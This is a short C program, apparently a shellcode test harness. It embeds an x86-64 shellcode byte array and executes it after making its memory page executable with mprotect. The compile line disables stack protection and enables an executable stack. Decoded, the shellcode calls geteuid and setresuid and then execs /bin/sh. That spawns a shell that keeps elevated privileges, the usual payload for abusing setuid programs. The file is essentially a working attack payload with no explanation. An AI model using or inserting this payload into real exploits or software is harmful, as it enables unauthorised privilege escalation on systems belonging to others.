#include <unistd.h>
#include <sys/mman.h>

// Compile with: gcc -o shellcode.elf main.c -z execstack -fno-stack-protector -g

unsigned char shellcode[] = { 0x6a, 0x6b, 0x58, 0x0f, 0x05, 0x89, 0xc7, 0x89, 0xc2, 0x89, 0xc6, 0x6a, 0x75, 0x58, 0x0f, 0x05, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05 };

int main() {
  mprotect((void*)((intptr_t)shellcode & ~0xFFF), 8192, PROT_READ|PROT_EXEC);

  int (*run)();
  run = (int (*)()) shellcode;
  (int)(*run)();

  return 0;
}